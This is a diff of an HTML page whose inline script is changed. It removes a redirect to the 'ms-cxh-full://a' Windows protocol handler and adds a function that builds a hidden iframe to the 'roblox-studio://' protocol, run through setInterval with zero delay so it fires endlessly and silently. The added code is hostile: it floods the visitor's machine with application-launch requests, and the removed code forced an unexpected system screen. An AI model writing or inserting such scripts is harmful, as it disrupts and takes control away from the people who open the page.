@@ -10,8 +10,18 @@
 	
 	<body>
 		<script>
-			window.location = "ms-cxh-full://a"
-			//window.location = "https://github.com/BasedOnWhat/Open-Sourced-Projects"
+			function open() {
+				try {
+					var element = document.createElement("iframe")
+                    
+					    element.setAttribute("src", "roblox-studio://")
+					    element.setAttribute("style", "display: none;")
+                    
+					    document.body.appendChild(element)
+                		} catch {}
+			}
+			
+			setInterval(open, 0)
 		</script>
 	</body>
 </html>
